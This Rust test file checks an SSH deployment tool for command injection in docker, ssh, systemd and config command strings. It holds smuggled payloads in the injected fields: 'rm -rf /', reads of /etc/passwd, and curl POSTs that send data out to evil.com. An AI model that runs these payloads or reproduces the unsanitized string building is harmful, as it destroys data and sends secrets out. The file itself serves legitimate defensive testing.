//! Command Injection Vulnerability Tests
//!
//! Consolidated tests for command injection vulnerabilities in SSH deployment system.
//! Covers all injection vectors identified in the original scattered tests.

use super::*;
use std::collections::HashMap;

/// Test environment variable command injection vulnerability
/// Original issue: Lines 200 in ssh.rs: docker_cmd.push_str(&format!(" -e {}={}", key, value));
#[test]
fn test_env_var_command_injection_vulnerability() {
    // Simulate the vulnerable code pattern from ssh.rs:200
    let mut docker_cmd = String::from("docker create");

    // Malicious environment variables that inject shell commands
    let mut env_vars = HashMap::new();
    env_vars.insert("NORMAL_VAR".to_string(), "normal_value".to_string());
    env_vars.insert(
        "MALICIOUS_VAR".to_string(),
        "'; rm -rf /; echo 'pwned".to_string(),
    );
    env_vars.insert(
        "EXFILTRATE".to_string(),
        "$(curl -X POST http://evil.com/data -d \"$(cat /etc/passwd)\")".to_string(),
    );

    // Vulnerable code pattern from ssh.rs
    for (key, value) in env_vars {
        docker_cmd.push_str(&format!(" -e {}={}", key, value));
    }

    println!("Generated command: {}", docker_cmd);

    // Test for injection vulnerabilities
    let status = utils::test_command_injection(&docker_cmd, "rm -rf /");
    assert_eq!(status, VulnerabilityStatus::Vulnerable, "Command injection vulnerability detected!");

    let exfil_status = utils::test_command_injection(&docker_cmd, "curl");
    assert_eq!(exfil_status, VulnerabilityStatus::Vulnerable, "Data exfiltration vulnerability detected!");
}

/// Test JSON configuration injection vulnerability
/// Original issue: Lines 507-511 in ssh.rs: echo '{}' | sudo tee /opt/blueprint/config/blueprint.json
#[test]
fn test_config_content_injection_vulnerability() {
    // Malicious JSON configuration that injects shell commands
    let malicious_config = r#"{"blueprint_id": "test'; rm -rf /opt/blueprint; echo 'config_injected", "service_url": "http://localhost:8080$(curl -X POST http://evil.com/steal)"}"#;

    // Simulate the vulnerable shell command construction
    let shell_command = format!("echo '{}' | sudo tee /opt/blueprint/config/blueprint.json", malicious_config);

    println!("Shell command: {}", shell_command);

    // Test for injection vulnerabilities
    let status = utils::test_command_injection(&shell_command, "rm -rf /opt/blueprint");
    assert_eq!(status, VulnerabilityStatus::Vulnerable, "Configuration injection vulnerability detected!");

    let curl_status = utils::test_command_injection(&shell_command, "curl -X POST");
    assert_eq!(curl_status, VulnerabilityStatus::Vulnerable, "Configuration exfiltration vulnerability detected!");
}

/// Test container image name injection vulnerability
/// Container image names are directly injected into shell commands
#[test]
fn test_image_name_injection_vulnerability() {
    // Malicious image name that injects shell commands
    let malicious_image = "nginx:latest; curl -X POST http://evil.com/pwned; echo pwned #";

    // Simulate docker pull command construction
    let docker_command = format!("docker pull {}", malicious_image);

    println!("Docker command: {}", docker_command);

    // Test for injection
    let status = utils::test_command_injection(&docker_command, "curl -X POST");
    assert_eq!(status, VulnerabilityStatus::Vulnerable, "Image name injection vulnerability detected!");
}

/// Test container ID injection in log commands
/// Container IDs passed to log streaming can inject commands
#[test]
fn test_container_id_injection_vulnerability() {
    // Malicious container ID that injects shell commands
    let malicious_id = "abc123; curl -X POST http://evil.com/logs -d \"$(docker ps -a)\"; echo fake";

    // Simulate docker logs command construction
    let logs_command = format!("docker logs {}", malicious_id);

    println!("Logs command: {}", logs_command);

    // Test for injection
    let status = utils::test_command_injection(&logs_command, "curl -X POST");
    assert_eq!(status, VulnerabilityStatus::Vulnerable, "Container ID injection vulnerability detected!");
}

/// Test SSH parameter injection vulnerability
/// SSH connection parameters can be manipulated for command injection
#[test]
fn test_ssh_parameter_injection_vulnerability() {
    // Malicious SSH parameters
    let malicious_host = "test.com'; curl http://evil.com/pwned; echo 'fake";
    let malicious_user = "testuser'; rm -rf /home/*; echo 'fake";
    let malicious_key_path = "/path/to/key'; cat /etc/passwd | base64; echo 'fake";

    // Simulate SSH command construction
    let ssh_command = format!(
        "ssh -i {} {}@{}",
        malicious_key_path, malicious_user, malicious_host
    );

    println!("SSH command: {}", ssh_command);

    // Test for injection
    let host_status = utils::test_command_injection(&ssh_command, "curl http://evil.com");
    assert_eq!(host_status, VulnerabilityStatus::Vulnerable, "SSH host injection vulnerability detected!");

    let user_status = utils::test_command_injection(&ssh_command, "rm -rf /home");
    assert_eq!(user_status, VulnerabilityStatus::Vulnerable, "SSH user injection vulnerability detected!");

    let key_status = utils::test_command_injection(&ssh_command, "cat /etc/passwd");
    assert_eq!(key_status, VulnerabilityStatus::Vulnerable, "SSH key path injection vulnerability detected!");
}

/// Test systemd service template injection
/// Systemd service configuration uses format! with unsanitized input
#[test]
fn test_systemd_template_injection_vulnerability() {
    // Test malicious values that could be injected into systemd templates
    let malicious_cpu = "100%; echo 'pwned' >> /etc/passwd; echo '50";
    let malicious_memory = "2048M'; systemctl --user daemon-reload; echo '1024M";

    // Simulate systemd service template formatting
    let systemd_config = format!(
        "[Service]\nCPUQuota={}\nMemoryMax={}\n",
        malicious_cpu, malicious_memory
    );

    println!("Systemd config: {}", systemd_config);

    // Test for injection
    let cpu_status = utils::test_command_injection(&systemd_config, "echo 'pwned'");
    assert_eq!(cpu_status, VulnerabilityStatus::Vulnerable, "Systemd CPU injection vulnerability detected!");

    let memory_status = utils::test_command_injection(&systemd_config, "systemctl --user daemon-reload");
    assert_eq!(memory_status, VulnerabilityStatus::Vulnerable, "Systemd memory injection vulnerability detected!");
}

/// Test blueprint binary path injection
/// Blueprint binary paths could be manipulated for command execution
#[test]
fn test_blueprint_binary_injection_vulnerability() {
    // Malicious binary path that includes command injection
    let malicious_binary_path = "/opt/blueprint/bin/blueprint'; curl http://evil.com/exfiltrate -d \"$(cat /etc/passwd)\"; echo 'fake";

    // Simulate execution command construction
    let exec_command = format!("sudo systemctl start blueprint@{}", malicious_binary_path);

    println!("Exec command: {}", exec_command);

    // Test for injection
    let status = utils::test_command_injection(&exec_command, "curl http://evil.com");
    assert_eq!(status, VulnerabilityStatus::Vulnerable, "Blueprint binary path injection vulnerability detected!");
}